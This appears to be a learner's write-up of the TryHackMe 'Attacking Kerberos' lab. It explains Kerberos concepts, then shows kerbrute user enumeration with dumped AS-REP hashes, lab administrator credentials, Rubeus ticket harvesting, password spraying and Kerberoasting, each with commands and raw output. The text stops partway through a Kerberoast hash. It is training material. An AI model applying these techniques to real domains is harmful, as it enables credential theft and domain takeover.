> Attacking Kerberos

# Common Terminology

1. Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
2. Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
3. Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
4. Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
5. Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
6. KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
7. Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
8. Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
9. Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
10. Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

# Service Ticket Contents

Contains 2 portions.

1. Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
2. User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

# Kerberos Authentication

AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.

TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.

AP-REP - 6.) The service grants access

# Overview

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

# Attack Privilege Requirements -

1. Kerbrute Enumeration - No domain access required 
2. Pass the Ticket - Access as a user to the domain required
3. Kerberoasting - Access as any user required
4. AS-REP Roasting - Access as any user required
5. Golden Ticket - Full domain compromise (domain admin) required 
6. Silver Ticket - Service hash required 
7. Skeleton Key - Full domain compromise (domain admin) required

# Enumerating with kerbrute

## Enumerarting Usernames

./kerbrute_linux_amd64 --dc CONTROLLER.local -d CONTROLLER.local userenum /home/n00bmast3r/TryHackMe/Attacking_kerberos/User.txt

```
2021/04/29 07:44:46 >  [+] VALID USERNAME:	 administrator@CONTROLLER.local
2021/04/29 07:44:46 >  [+] VALID USERNAME:	 admin1@CONTROLLER.local
2021/04/29 07:44:46 >  [+] admin2 has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$admin2@CONTROLLER.LOCAL:4fe0a276562d7b33dfa0c8833e913de3$eb70dd5674272875c07e76ffd649872dd8557785cc2cc38ceb6b743e72e514de0270c42b1c0fc13a7010b17343204ddedeca3170fd774baa5ee992e52c08730b8bddcc13f2e08dd70ddef2ff6df7e92077a59da93bb925c3f1a6627368aa5b66b1b175869b6d32403550038491b04f757b75416efda2d68f110ebd129c73dc850e5dcdfa6ce25b9df30a8e73a888ee761f7bc203221eb55dcdc630a6b4a854946c4b2bf774f594c2f63359e7638b71bb0ff9eb8f4a73ac6a6f99201979a3a6cdf66ebd6a2aff018162acf9049b2ddc575550fc2d653cf27fbaf6d62a7db4497d65b6e1618b3025e8f36a6c6726109ec3e375f5619f18c1959817c2ccb983a8925e46f72bc09c187a
2021/04/29 07:44:46 >  [+] VALID USERNAME:	 admin2@CONTROLLER.local
2021/04/29 07:44:48 >  [+] VALID USERNAME:	 machine1@CONTROLLER.local
2021/04/29 07:44:48 >  [+] VALID USERNAME:	 sqlservice@CONTROLLER.local
2021/04/29 07:44:48 >  [+] VALID USERNAME:	 machine2@CONTROLLER.local
2021/04/29 07:44:48 >  [+] VALID USERNAME:	 httpservice@CONTROLLER.local
2021/04/29 07:44:48 >  [+] user3 has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$user3@CONTROLLER.LOCAL:021a91aa4b05e28f7e3a454ca8b1fa30$5c913661d78ba97a26b86d97edc4311fbd5f0d2ce837f6d3b15334bd109408fcf19c73dc75b4407b9503511b86fc7ebaa03e2a8309e41924cc89e1ea40f7ab6b31b5ee23571f5a6eacd9e18b495e241cb64bc42461cf13282936971927839057f70bd379caea98a7073151a9cd68d9a8132364898fffb38d4763b6e4b208c5ddbcf82a927a8831e3e17b47465ae15986b7a4e9be57cb88a85306f62552fde5d2735d4fcbe3a7e1137b4c643a7bd9fb2b4c8172632fbdfd6d3b1400d3db15ef2e7ffa3f4a12d3a41ac5799d562e401a85f9730a703459406a287670d58a68033d8177a8bf75d5f25cb3095aee211e16b6afc4226e7acf9a4da6201629e49bc1eb7b08b8db06fde1e3
2021/04/29 07:44:48 >  [+] VALID USERNAME:	 user3@CONTROLLER.local
2021/04/29 07:44:48 >  [+] VALID USERNAME:	 user2@CONTROLLER.local
2021/04/29 07:44:48 >  [+] VALID USERNAME:	 user1@CONTROLLER.local
```

# Credentials

```
Username: Administrator 
Password: P@$$W0rd 
Domain: controller.local
```

I used SSH to enter the System. 

# Harvesting tickets with Rubeus

We have Rubeus installed on the machine in Downloads. 

Rubeus.exe harvest /interval:30 => Harvests tickets every 30 sec

```
  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL 
  StartTime             :  4/29/2021 4:12:44 AM 
  EndTime               :  4/29/2021 2:12:44 PM
  RenewTill             :  5/6/2021 4:12:44 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEjVpA6eZC2SGn+8DOSPMXV6IJNGbV+wqLuai
    kEHcwXSdE6Zg0+5TLYCG80iNKrGCpoorGg1p1bHIC3kNLyIi5UqljtWtlzESAJ0tk13dP2mJmhGdRahtc4qUsgcTk28J8modbNGt
    roLS8Cwqfz9NHVHfHnh8KVCbFzDIDLrh2xBBQQrFU16ljWjh+i43xkqsgwZgukhgW119QieCHhUJbkQqypzMyew78Z5XVof8XZXm
    tvLjOfesCM8L/tJUkNoUGWkFxZ/37Ysa3MOVB0iG4MaCapYSv2Xu3dV7HxccQyxAxYXrf4UPyu092UQKWNn3+uHLft/UIn7IVQPu
    2+J3AwI3ZhsD67xwwLiCRBtNwV3de8rgfsY98XbsuANiQAZrOHgcXyO+LkYjtVPMHohrBBuh8E+Cm2yX0NevEadxym/LhRuzsPgJ
    cns/D7Z/GA86OlOizQbZS1Jokv88amC69EEg/ERnQsP5VMA1IHjipW/7MyPsq8yuxic8rZgasaXpXT8VbFI9k5KfbLDI2nbmt9Y5
    cnaFG1TLwfcpncKdGebDLhsZHV6aRpFs8aqk7hXMmPe9zpDg3OHul8wC6F3E06/XD8Zh1SOt047Qm0blP30Vrm0HjkHT9YJoJAeo
    juk+SoMEHri6qtZROUgwogs29mMGtYfuY2nYyTZsbc9ZR9cZhY/NH8NTppTFpllynUInvJRJ3cy9mtzc0EEkD3UlSJNtzlXMOWFw
    BCdaZjQHrCEwsppZTdEHfzPevBL0RXDCctpLqJTuFdmaYX+CHh2Jru8uSPtCyaV6SDJV4iE4wxp69WFJelb2UyHDAgppykIHU9et
    Mnl6hzvAYrWIIyydvZFdWpj9KyKhUT7ELyDWrCZSDl5DW17ix2HNGdzwTsToQ1HWJELqkKpfTJ03a7om2dcDqbu/1eXVkDXe/itP
    YfihqSUZg1AleaPoE1L88GwwIQrpGunvFIeBKMKcK8ibbuSLPfwKCNeQRM1vQ430jEk5TNtbkzctiszN28koQGsFrxzo5z0T/MZL
    rT7vuZhWVpCAiK/vQMERFCm0SFzQzIhTvQus5n+bBcav7k2gfuzu+MF9mM77dPdHVb+5UXW/32TE71Et5CSF1AiH7/tbrK9ZEa6v
    RTj+hpsk+QotSP1R2BhD6pYpZHu6NyI+31OiTd+YBcCtl8ETIdTbuQsRXtjOknvJmVSA0IZprGcyoqJvcJZny1x3th0SEF4nVkYc
    /8kbsbrTA3oDA2vQ8jXV9qiFixIRyaWkYwrJhFYQNDjXRZYwKESyu4ZcG1T2jK8dWWVHSH90s5sK4pLg7a9exyiNSkRrW0M/lZLs
    TjNG9FCvLK3lMzDvLbUzzWZs9sQLIl2NiPIu7vMxgTYrNnwVYIduxmyjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCCkdIZdSF2SAu/cCLUkFHbLasomGwDirSfwHyKtMUn9W6ESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMDQyOTExMTI0NFqmERgPMjAyMTA0MjkyMTEyNDRapxEYDzIwMjEwNTA2
    MTExMjQ0WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM 

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  4/29/2021 4:48:27 AM
  EndTime               :  4/29/2021 2:48:27 PM
  RenewTill             :  5/6/2021 4:48:27 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGj4/hPuce2u8pQcM1wUBIsXrleP03pWLc5mF
    J5UM2svyNs5NZAN5ukSWwIb6fUgeOZlAbqygdbWoCkkHOHnsjoVYIq3fy4iZ94ZKIGUvfvBEeW8aKrwvhtvJHxecj0834Q+xCJca
    2ketMicWytpaTVNvSE9ld5jNLMzvzY3Mi3DGKb8mCCpeO3JotcrUwZ/D7A1j0hNsH50Uham5UoW1+IxSJOfz+TAEI1X1JwGiWP0W
    LDBxs8tFlU5BoV78BE0s1cfTOkPGzYVJm6n4nFS7UHYhF2W9q622DDGtUwczpAg6ybfSEN1WfSiHCGyMl8jztj1g86zcSZ7BVF25
    J3bdI6h6yQ8X5iqCD192zjk+wUeHnXScChGRBwRhTVH1IH/eQWfuHZv9RebDP6e9u7jh6mdxhzoY3H1yOst1B984N8ygZK6LVZiL
    kUR+TcY5LRofC21ChuhpwcJO/FZykSHtCVPU6BnXs+qFAonWDliLOTnn1dN7SPqGwPeffeutVGEPQUW6Gm6V7/GaayyIXCnrowav
    q2afU0KQou81XHtoHxw05SgA+6T19lejS+2xvbeW1BwST1dJCnsh+4TB0s89tN9GBWfORHVxnRWdP92bVwVW98ri1FTx05vOpiZQ
    wg9px6+qcYIn0TW29Kf+cSl9qUbm2wCZPIlryQaBuwRbz9VP8jTsvK5GkDvzBBlCpKhZ49lobHCaaVjaff7MRaDwP7j2oojTqhKY
    0noWvsL97lQ43RO0Oys+Gdpt/2MIOgeZGmMupC7kk9d50JaIDLUbl7QnITFYEtGeOBC5nf2ji+WCB5k9YQt5q3oThpS4h377Fo06
    l3LKjV8yxQPh0V5bWU8QdH8xiiXlKidCuHr+EOpZVuTOCtIHvufPNB/6U+6g71dJfZa6JZ7kBvNIZoEjVbvKCHThKHF0bOIehuy/
    TQEw+2fAKHauggWs5NW8SzBULBstDhgvSBeNW8KMlmivvgfw+jLxG7GCgbbY+n1RX5X9jzvnfNH07rfmgv0tUnmKTDGXyVY/erLJ
    8Y7gJYTI3JPDNUVAECx/sONZRHudBZqOIzvtcrV/CAHUDMn3SKXuxMgd3qGg+Pkzoy3X1stPmtZxiy59DfX6OQ/nij7NCq/UV/DC
    jbMxC/sCkTNqjg8ir4bqTuaSKb8zgKCIfJV28c/lQuuQQP56kch0p3MrZKPhJ3DcRGKTj+sUj6BXofjcyJpB92Wwh+bsWBf0s0xM
    Cy0Pq2JFD7D0jGk1lEKyEKG5Kdlk5yM3kqAaMVGHstb9QzFdkJs9vozj6OrzakYgV7U/DbonZpvPQAaQx87IwVchO6KhsOZx0oin
    yyq2/O3EwLmCWMM65paO9erwRkpi5S/CtIISPl9+GQzbcc3aPBPJkJlcWaTQ8vn50aOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
    MIHdMIHaoCswKaADAgESoSIEICB15JfqegAshZ5Vzw/bPW5KCIvyratp7F9RhrTvkzTJoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjEwNDI5MTE0ODI3WqYRGA8yMDIxMDQyOTIxNDgyN1qnERgP
    MjAyMTA1MDYxMTQ4MjdaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  4/29/2021 4:42:10 AM
  EndTime               :  4/29/2021 2:42:10 PM
  RenewTill             :  5/6/2021 4:42:10 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEqCBZaELdcDD11GbNI7qzAkL+QG2ZEbWiILJ
    xLwaZEENkAEsLhp6mh/zXjI5q7EkVL+DVbs4jhmpsne5c4JuIWGGglIiROlVgs3c1+WqyljPwZa3XYJDimvNyhJCzxXd+QkAYX7S
    9SqD+5/KN/62pN82kmMcG8Zq9ikcX2Cv1CIj3h5I9HP7j0p4jQQiUflCpujt29XfSObPQx8TOvCSHNjms7z3dx+oHIkOjWEuEBNQ
    kPudK/bG9sSi3ZsfRf1O0zv3lhdbI4GkFe2o8GkLkDPWPiFjeLBo+VmYsBgG75i2Ar39edcoI2bAc6R4rb1bvGKNO0VVs2UhKUnz
    RuohkJSSAsnB+/cvu7dRpZWfGb6pdZbFNzN45skhcwP/YgcL91WqhKyvB9acx+pLsueLc9EyVI9R7VrqDTQR1tWUzvdW7QMC6L2N 
    axbzdMMKPNFER/aarIStW2vEuA0bYzpf1TbREdZP6tGNehLtNbnagAlNWt7DDSvyyhd1xbHchNk0pLyDM48zYs9VdB7yDlDJ1ouD
    gedAYG2cIven+Xq5JzjTsENDogra6cyCsLfQdZbnlWGiVGwvdybk2TQn4zRpgvZ/22tLXNrOP7BSw3E7KfFT9/QOWSXJK9xpwb+e
    hNUsDlCFeQcIKbI9DjYmX/40qenoDHIr6qg4cCkh2kDoaFdj3vug3azrGQr28P9NqpvGTFMP2BcR1LOchBk5gNhDgHUgJqnL90BU
    lFSQ9Dhp5UlRc22XD7QNv8KNCyKMtOGktYJZX3NxVZvhIyIdXG/+20iGcpasltb+bC0dVVWG26RZlsKNpuGs1deP/p7DJl0Gp3I1
    1YU7wwp7HjD6cZkH/jAAdpaErtdAv6SsTve0JxgPnkjh8hP8kn3gOXDN9gqkdZD/DZbONHGfpsynKD2OuTK/3JkOGz9+PzkL8qi9
    ZQRrlKhchpRLFatMNc60Y4emUIaEOHC7/gRKYkE5J+Vcyik32fXSKqQGQYLI8V7DIVQKyumr0VMQTzlCgJwJSfVcTJ2H38J57Q7G
    Tup+0XNtWzbTOyt0Kqm4Shjq7GcYaGMfJZtHVmjzcHwk7Zie+rxp9j4k0Micemf/2JxCDaGtkEC9DDsbO1WtGikSpJmOGHA2jx8j
    PRzJ5udpji84T7LbzX/0gn4HdKjIsSh8u0wfa34nhR7FM3Ho83cV1mIKALQZOLsBrcCC8xqjlcpYKeLbwVjQUgRghj/vSgYPdG2O
    Moywd055m13s2VsSTivnO2HxfftJGJJChlx/6DI27lt8DmOnQY7qaVyz1hZIgXwXOLALqgKHRvTNdFPeopTVkIh8PxgWH/bm0Ijk
    VncxkrudD94NXE5RKhRUrMlhOody15DI1SpMuld4EoD0hmdZK7d2OcCjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCDHgQuzLpDjNrsnbTMo8iJ6J8J51zf6J80cyZSrEW61bKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMDQyOTExNDIxMFqmERgPMjAyMTA0MjkyMTQyMTBapxEYDzIwMjEwNTA2
    MTE0MjEwWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  4/29/2021 4:12:44 AM
  EndTime               :  4/29/2021 2:12:44 PM
  RenewTill             :  5/6/2021 4:12:44 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEgrwRiR1qIpEEK0AdT8AMj2eSsaslyJbvNZb
    r5GDwIh2UD0D8oCrJdsl4V4ttoJWRUf/1rUfYh8lkkZ/Go16c81ewuna7SzmuGw/jS0Q59wBY+ePsGGuxYStTJyRPy90c4hXtXhC
    u+Xl3JnivlNTmusMi0YQLXLa5UWoXIRZbcEYoygvQJymqmOmMhAnMIQBlJuNyEr9sjfNDmVj2Xzcu7CnRh21mWKjYa7uevYK0xcN
    pcanRJr9Y6/sYiB6yec5fHm/0tXzgoEZsbqsqUx1LlBBFak/kLn3kh4LQ3WKfQjmcsiqCRcyZBKSN/S0MVCyKjHpWD9ZJT8bcoRX
    Ot4p11/+NUTHAOQnw/YkgRJlwbW/uV4c4suocbUDjgHemZqkeSAEk8rIZg8hjD5yj2QFypd+9oDkn1rL952l2SePKDdDTKkK5EFl
    Wwh/PmYfm/ryMHBPJkJsLO4VOcL+0v63LKhR1R529hWyQEdCNANJeNTAGgpDATrIpfa4CyD/0mQJT2JLC4ddLBUwSnHUtpPHHuWU
    REoGIFzDUey+PHax5xtpo0icwXkuvLbukLLHgHGgVnqCAyUh4QRgWvU86b9sytvt6YcTzGlKrDcMlRYiOxLqtwdsjXhmITcIYbJs
    3kZK6MKRHf23RSDXAlwvBpxXTKPPOdqpto2QtfLlfs9MlQKsLxXgQyhb7K8oR5Z1ZJ+P0+oncO/DR0mXkIBxF7npriFPX1CvqFmu
    +qlMRQMrPT3STZ5n52BfBqUiWX46E3wIgEJY79EPtsSU9+t6LZsbUEUQ6/4/KMwrx0JNjNJzDu6bRJlzWZuwzgU3GtDWK2DuNoKP
    uVDBSixVw1WqF/qWh6kuZMXJZVbGFzVTi2pXQAHL0aEqQw1yaax52zTaqr2kDhOZ21dLBNuO6NFZpSDVHuRkgW7wFtb3Utn60ZwI
    urzq2DKf01DF40sXhzeEiO8Hgz7x5Q6qBDciwx0+2fUwvjK3ebP0GMl0SdWdjBozMNpsqkBoN/owYqwXipQZHlLKXPJeq8Rp6yA9
    R8f+75VHo1qir01tu+sQ650L/JzleR+/m/ZNS5D+b31Sy5scMhvISf0zvPw2GOyIaCzI6UHoe9/peoByXthCPDKysphJ2aqWDYWh
    5Hy6BCn5XUUmH3jAF+nCbgLJDf5tp0HDnUT1m/FDhg4QIgSJVeoub2eS/+qntQ5Xa7+UnenoYdszfmeyl0+ErCJPmy2qMKmqxAgb
    48WHmiJwrQrKhNqYBfL1RZGmS5AsP/W+Pq/HC4B3/FLvt4J9EoUwKLXIRsShLUN+g5xCc0DO8R8mrAGwIt4nxTWiyyipQz3OMDVH
    DetTaJcMO/llURi7dyIjq57yl+hjptAmGzqM9YOBsXVv3VogHj2lfs+jgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCDYIlP4hGEUl+xRZggprMcHp5Qu+dC4DI+q2Bv5GEuhXKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDIxMDQyOTExMTI0NFqmERgPMjAyMTA0MjkyMTEyNDRapxEYDzIwMjEwNTA2
    MTExMjQ0WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM
```

We can both brute force and password spray using rubeus. Here they are explaining password spraying.

# Password Spraying

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

**Note: Add `echo 10.10.225.201 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts` in SSH session**

Rubeus.exe brute /password:Password1 /noticket => `This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user `

```
[-] Blocked/Disabled user => Guest 
[-] Blocked/Disabled user => krbtgt 
[+] STUPENDOUS => Machine1:Password1 
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7Sfd12cA+8ulQB2FYTQmJ3G9Z5B6/lEBEvZULsU/fis86NOl7ph7KHeQxgDLd16HopToBVGZPctQ
      1mpy5SRa82fe2t6R9xOGK44HxV+0Q7ZouJSOlBJiB7pso9K7kpKh0ava/ieCxCdaCAyRriTortSS2Wet
      8bwQB6RQZPr4hE9O0UqUpLEH5wP28NtH0LGu9stUcapAp5SX8UaXJ/7s6UcOFioSV5z2gFxNfNI2TtG8
      y0+rGustuhWOzf8dCikNN5ixMs7aiBDW5G/BCEt5p2XjJxSREa/zahtzO3Qk+YSAW3OtRJ+Q/HeNl5CA
      iMe5gR55I6cxTn4ZAenQ6hYj+2QDg5gPqRQ3jpbt5IrMmf3/Rdk4JDNbVWGrUXF8MQRQ3W46jNO856e7
      KVmV6vEM+HYIPuWs4M30LnKU4T5RAVifo5HVtLohMdL7CT9D1JVdr0x26Vwy1ve8/EWDltSpviVA+7Gv
      WHb/mXU0v9VhznVZsatPXdSvJSFhsTmcjgeu1yd9hpjOAUZpqYTWQ8IcSi4nnuoN83kRvcR4K4FIeyck
      x90eQT2Yn/11bFPujsL0UkjfjF8N7KBiCqKNZunjkPecgFNoQ8lWRbsRIDl9y3ANHPz78VGaMpDAVINQ
      Sz1fAYNhMGspKub+Rs9QIJnvOSFNX0UbwU8RRDpwzZQV0Eeu5oYU3Nunho1l4mCKmO29+sBO0MWEomXL
      9J2uVDhDt11BH3IucP7EZ1Szoa605Hae9AGXZ39FdESnDotWzE3mtkjxZhPB/o2vJOaMAnmi/YRuplnz
      t4akcdZaXiRj1e0LpI3lmY1bWrNCBobMmdvvLpITvei0bA2OxH7wTgb7DrqDVlR1mnOgJ0Y0z4qsTUgA
      ZetLrOUq06BdMsdj4/TZ/xlje1vHB4rOO2xjYkvEmH7dPJXrViuaCGH49Mu134NuOc5UWrz1HhiWlh+X
      /UT2/RAnbKK6V22An/PA3xT/1eQKA3DQ1/+qmLJHrwUyThVgmoUOPuToMWqGwrAc1EwnWoldKiAd4F27
      EtNbRK7W5FOivDnu+tQ2f29rRuKLOyt9j8SHrbmEZUcTg6NC9dmwcI8rUQf23PrHC38YvQzKmMBBvUbX
      NNiJb3u3Ib06goVLcpa9tKGXxLRYJ5XPef73Y0mlmNo2MO7jwInRCkiEUBC2hWEyNFxgcVA30SjbhGjP
      2o004evEKKEysjiYklpSBh4qsUhq+hvZ4EgcSUsf7V85mMJdzyWiDvkZDsytI1p2ZbMs6JOXqv1ZMeUQ
      c9aaNYWOIG8GWK7R55d0xN5FfZXLewdzzeDhv/22VIjg7ypASkGWxf5cn2vdeVI5lqOB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIFUfGxyMcF2/8asehBTkw9kQXqP4EvzQygO+
      xjtZNcg0oRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIxMDQyOTExNTc0OVqmERgPMjAyMTA0MjkyMTU3NDlapxEYDzIwMjEwNTA2MTE1NzQ5WqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs
```

# Kerberoasting

## With Rubeus

. .\Rubeus.exe kerberoast => This will dump the Kerberos hash of any kerberoastable users    

```
[*] Total kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local 
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$94BC8A2C107028E90A458373628D9DE8$04AEC03B08730900204D750283AB52B1B2BA60 
                             B0A741145FA146526D778A7CD2FFE4579426E718647BF8DC15A49255A29983A6B00C0116AC6CB7E9
                             C04310B889A0DE580C0105D667C25A8A16C04B5A382F974AA3C4CE4FF72BA0EE535EDC8F385C3960
                             91FCBA55A7554B0DD8DB2C1EDFFCF772CF854A2C23254215E06BF72A3FC65C52540AA2334BEC248B
                             7A20D7BC1751FBAD8F54A130D3AD7136A85D27415110C43C0BB38F1E020C37037F12F0308ED621FC
                             E6B032A9F51C48A5655070C7AD834EB299B0B46AB75AFDB1AD65AD624945EA5808C1C030D83D6E34
                             FFAA523F9DB482F6249A7C4337C9D0780DAC6E05B747D1FC30E91DD0EB818F5029989FFF8BC0FFF9
                             F6B6F24A2D76E5F2184F3DC194CE10B0421BE7A1239A4D5A01083369F182C5EF0456BFF815BCED60
                             CA8CBC1197BCDECE6538E42122E3A16BE80BA07EACE45273D3DFF95A18E1A3624EE558C325428C42
                             72CD308B3330E8B2EAD8F599482E54F18B7A9ABFC83A0686F54A00B2890F8DA712C51D9021B55E36
                             BA11A2FDF8A0817E7E85252B092E4B6BC09B52655F2B0550AAA7C220313A0A6D95BF2825E555E318
                             6D60A149B125D0416EED9509E1426297881B9D92E05EEC2E8BADC19A01C5D862E0C54F8909B551CF
                             8617AD4A2439EED93B27F9D3FF3B3BF4A93C05C46A297519CC56D3570F3AC1ACC8BA015274C9D9E4
                             1B977E837026313E920C0E40AC808B6A81041A11AFAA6E4C8931042E2B6746A21EB3E9F7F3FD1E4A
                             4B41F0185516EE7930B8568F39B0C048A229AAB7CEABBAB19041FB51E10D675ED1DE4E346E53B117
                             2881F629D2D2BA87DFEABC76E33BF140A1C43F0AA334CFE16FC6BB94B811A7CC7F4060F70494ABFB
                             9459309092DB966815411AEF171A04F4E5DEA0FEA99F87870C12F04D5EAFB7D825C2E8450CAA7AD9
                             BB76EF86E5A1921492CDAE47E38969D4CAD0EC03B76D70B72B3018CA5372E1DF817C42E689621C76
                             58BFDB81CD00D1295D6D1B7954D68B559E4431515A8AAC6330C86B1799FAEE1EFB817A5697490138
                             6995D96F3756A0560199FB7C7A0742F96121E8343633BF6098534CE56E8D6B101B555F11081DFF6C
                             D9A19B759005CD4F5D3156B29E4C9FE2EBB10986BD4B1AD10DFEF4FB75FD9EF822A289AD0405E2DC
                             9BB44C11CC7FBE7F3C480EDE00BD8659198D8A8947A85E3C825EB04B4A9E07AB33CE2F558F2E5972
                             BF9EC915A4D783FA653A8827A5CA1A56D0F3FF2813A32071BAE5ABCD623E74EC10250DB329DCB160
                             52AA9EB8B7661E2953E1B1B6F1389983124EAF2A85122F4CCE760DAABE60C27D5CCD5D6A8C8F2669
                             DEC5D09D2DBE6B107CC2F271EFF8AB3F9271B3A6A61AA0F98C7822BAC83E9CF0FC5F1135B21EE8AE
                             3BC4FC31D331091162B82D37B65A36578BE0DDBBD30F29419D53C048456D723DE7F19A468E1A4257
                             DCC0F10D2F600D75DC150C59ABC1C5D0CC243123DD6A5E776566592C4E95A3ED8A481E62D6F1C24D
                             1F859AD809F30B79AE407FD6F7E9A552ECEDB44C62637CD11C8533077922D8EDA8B3A2DA22AEE266
